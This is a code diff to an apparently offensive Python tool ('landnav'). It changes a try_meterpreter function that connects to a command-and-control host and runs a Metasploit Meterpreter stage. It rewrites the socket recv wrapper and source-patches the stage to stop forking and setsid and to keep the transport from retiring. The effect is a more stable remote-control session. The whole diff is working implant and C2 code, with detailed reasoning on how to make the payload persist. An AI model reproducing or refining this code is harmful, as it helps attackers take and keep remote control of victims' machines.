@@ -469,24 +469,24 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
             except (OSError, AttributeError) as e:
                 log.warning("Socket hardening partial: %s", e)
 
-            # ── Socket monkey-patch: MSG_WAITALL on ALL recv ────
-            # v0.4.9 tried to add MSG_WAITALL by string-replacing
-            # the stage source.  This silently fails when the MSF
-            # stage uses different formatting, variable names, or
-            # is minified/obfuscated.  Instead, monkey-patch the
-            # socket itself — works regardless of stage source.
-            #
-            # MSG_WAITALL makes recv block until ALL requested bytes
-            # arrive.  This is safe for MSF's TLV protocol: the
-            # server always sends a complete packet before waiting
-            # for a response, so all bytes WILL arrive.
+            # ── Socket monkey-patch: diagnostic recv wrapper ───
+            # v0.5.0 added MSG_WAITALL here, but that BREAKS the
+            # stage's first-packet detection (TcpTransport._get_packet
+            # checks `if first and len(packet) == 4` to detect a
+            # re-sent stage after transport reconnection — MSG_WAITALL
+            # forces recv(32) to always return 32 bytes, so the 4-byte
+            # stage-length is never seen alone, and the stage body is
+            # misread as a TLV header).  The stage already handles
+            # partial reads via `while len(rest) < pkt_length` loops,
+            # so MSG_WAITALL is redundant.  Keep the wrapper for
+            # diagnostic logging only.
             _orig_recv = s.recv
             _recv_count = [0]
 
-            def _waitall_recv(bufsize, flags=0):
+            def _diag_recv(bufsize, flags=0):
                 _recv_count[0] += 1
                 try:
-                    data = _orig_recv(bufsize, flags | socket.MSG_WAITALL)
+                    data = _orig_recv(bufsize, flags)
                     if _recv_count[0] <= 20:
                         log.debug("recv #%d: requested=%d got=%d",
                                   _recv_count[0], bufsize,
@@ -496,9 +496,9 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                     log.warning("recv #%d error: %s", _recv_count[0], e)
                     raise
 
-            s.recv = _waitall_recv
-            log.info("Socket recv monkey-patched: MSG_WAITALL on "
-                     "every recv — no string matching required")
+            s.recv = _diag_recv
+            log.info("Socket recv wrapped: diagnostic logging on "
+                     "first 20 recv calls (no MSG_WAITALL)")
 
             # ── Socket monkey-patch: sendall for send ───────────
             # MSF stage may use send() (partial) instead of sendall().
@@ -543,9 +543,12 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                 log.info("Stage marker [%s] %-20s: %s",
                          "✓" if _found else "✗", _label, _marker)
 
-            # ── Source patches (best-effort, verified) ──────────
-            # These are defense-in-depth alongside the socket
-            # monkey-patch.  Each patch logs whether it matched.
+            # ── Source patches (critical + defense-in-depth) ─────
+            # fork-disable and comm-last-init are CRITICAL: without
+            # them the stage forks (parent interferes) and the
+            # transport retires immediately (communication_last=0).
+            # comm-expire-guard is belt-and-suspenders for the init.
+            # Each patch logs whether it matched.
             _patches_applied = []
             _patches_missed = []
 
@@ -566,12 +569,21 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                    'fork-disable')
             _patch('os.setsid()', 'pass  # landnav: keep tty',
                    'setsid-disable')
+            # Initialize communication_last when the staged socket is
+            # assigned — otherwise it stays 0 (Transport.__init__
+            # default) and communication_has_expired is immediately
+            # True, causing instant transport retirement on the first
+            # empty poll.
+            _patch('transport.socket = s',
+                   'transport.socket = s; '
+                   'transport.communication_last = time.time()',
+                   'comm-last-init')
             _patch(
                 'self.communication_last + '
                 'self.communication_timeout < time.time()',
-                'self.communication_timeout > 0 and '
+                '(self.communication_last > 0 and '
                 'self.communication_last + '
-                'self.communication_timeout < time.time()',
+                'self.communication_timeout < time.time())',
                 'comm-expire-guard')
             _patch('DEBUGGING = False',
                    'DEBUGGING = True; DEBUGGING_LOG_FILE_PATH = '
